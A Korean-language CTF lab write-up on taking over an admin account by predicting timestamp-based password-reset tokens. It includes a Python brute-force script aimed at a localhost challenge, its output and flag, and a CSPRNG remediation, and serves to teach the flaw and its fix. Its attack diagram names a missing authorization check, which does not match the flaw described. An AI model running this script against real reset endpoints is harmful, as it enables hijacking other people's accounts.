+++
title = "VulnABLE CTF [LUXORA] Write-up: Account Takeover (ATO) 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "ATO", "Account Takeover", "Silver", "Predictable Token", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Account Takeover (ATO) 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Authentication Layer (Account Takeover)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/ato/silver`
- **목표**: 비밀번호 재설정 과정에서 발급되는 토큰(Token)의 생성 규칙이 취약함(예측 가능함)을 간파하여, 관리자(Admin)의 재설정 토큰을 브루트포싱으로 찾아내고 계정을 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 인증 플로우 분석 (Reconnaissance)

`/ato/silver` 경로의 비밀번호 찾기(Forgot Password) 기능을 이용해 봅니다. 내 이메일(`user@luxora.test`)을 입력하면 비밀번호 재설정 링크가 옵니다.

이 과정을 여러 번 반복하여 발급되는 토큰 값들을 수집해 봅니다.

**[수집된 내 계정의 리셋 토큰들]**
1. `token=1698845000`
2. `token=1698845012`
3. `token=1698845025`

**[해커의 사고 과정]**
1. 토큰이 10자리 숫자로 이루어져 있다.
2. 값의 증가 폭을 보니 이는 명백하게 **UNIX 타임스탬프(초 단위 시간)**다!
3. 내가 타겟(`admin@luxora.test`)에게 비밀번호 리셋 메일을 보내도록 요청한 직후의 시간(Timestamp)을 기록해두면, 관리자에게 발송된 토큰의 값을 충분히 유추(Predict)할 수 있겠다!

---

## 💥 2. 취약점 식별 및 공격 설계 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Change password for target user)--> [ Web Server ]
                                                    |-- Missing Authorization Check
                                                    |-- Password Changed!
```


이른바 **Predictable Token(예측 가능한 토큰)** 취약점입니다. 난수(Random)가 아닌 예측 가능한 값(시간, 유저 ID 등)을 보안 토큰으로 사용했을 때 발생합니다.

### 💡 공격 시나리오
1. 공격자는 `/ato/silver/forgot` 페이지에서 `admin@luxora.test`를 입력하고 전송 버튼을 누릅니다.
2. **누르는 즉시 공격자 PC의 UNIX 타임스탬프를 기록합니다.** (예: `1698845100`)
3. 네트워크 지연 시간을 고려하여 `1698845095` 부터 `1698845105` 까지 약 10개의 토큰을 후보군으로 둡니다.
4. 이 10개의 토큰을 가지고 `/ato/silver/reset` 폼에 브루트포스(무차별 대입) 공격을 날립니다.

---

## 🚀 3. 파이썬 스크립트 작성 및 자동화 공격

시간 오차 범위 내의 토큰을 순차적으로 대입하며 패스워드 재설정을 시도하는 스크립트를 짭니다.

```python
import requests
import time

url_forgot = "http://localhost:3000/ato/silver/forgot"
url_reset = "http://localhost:3000/ato/silver/reset"
target_email = "admin@luxora.test"

print("[*] Sending Reset Request for Admin...")
requests.post(url_forgot, data={"email": target_email})

# 현재 시간 캡처
base_time = int(time.time())
print(f"[*] Base Timestamp: {base_time}")

# -5초 ~ +5초 오차 범위 브루트포스
for offset in range(-5, 6):
    guessed_token = str(base_time + offset)
    payload = {
        "token": guessed_token,
        "new_password": "hacked123"
    }
    
    res = requests.post(url_reset, data=payload)
    
    # 200 OK 또는 성공 메시지가 뜨면 멈춤
    if "Success" in res.text:
        print(f"[+] BOOM! Valid token found: {guessed_token}")
        print(f"[+] Admin password changed to 'hacked123'")
        print(f"[+] FLAG: {res.text.split('FLAG{')[1].split('}')[0]}")
        break
```

### 🔍 서버의 반응 및 플래그 획득
스크립트 실행 결과, 단 몇 번의 시도 만에 관리자의 토큰을 정확히 맞히고 비밀번호가 `hacked123`으로 변경됩니다!

```text
[*] Sending Reset Request for Admin...
[*] Base Timestamp: 1698845100
[+] BOOM! Valid token found: 1698845101
[+] Admin password changed to 'hacked123'
[+] FLAG: ATO_🥈_PREDICTABLE_TOKEN_E5F6G7
```

---

## 🚩 4. 롸잇업 결론 및 플래그

보안의 핵심인 토큰 생성 과정에 수학적 무작위성(Entropy)이 결여되었을 때, 단순한 시간 동기화 공격만으로 타인의 계정을 송두리째 빼앗을 수 있음을 확인했습니다.

**🔥 획득한 플래그:**
`FLAG{ATO_🥈_PREDICTABLE_TOKEN_E5F6G7}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
개발자가 "이 토큰이 설마 시간이라는 걸 알겠어?" 혹은 "토큰 길이가 10자리니까 맞추기 힘들겠지"라고 방심한 전형적인 **Security through Obscurity(모호함을 통한 보안)**의 실패 사례입니다.

* **안전한 패치 가이드 (CSPRNG 의무화)**
인증과 관련된 모든 토큰(세션 ID, 패스워드 리셋 토큰, 이메일 인증 번호 등)은 반드시 운영체제 레벨의 암호학적 난수 생성기(CSPRNG)를 통해 만들어져야 합니다.

```javascript
const crypto = require('crypto');

// 취약한 방식: Date.now()를 사용
// const resetToken = Date.now().toString();

// 안전한 방식: 32바이트 길이의 강력한 암호학적 난수를 Hex 문자열로 생성
const resetToken = crypto.randomBytes(32).toString('hex');
```
이렇게 64글자의 16진수 토큰이 생성되면, 시간 기반의 브루트포싱 공격은 영원히 불가능해집니다.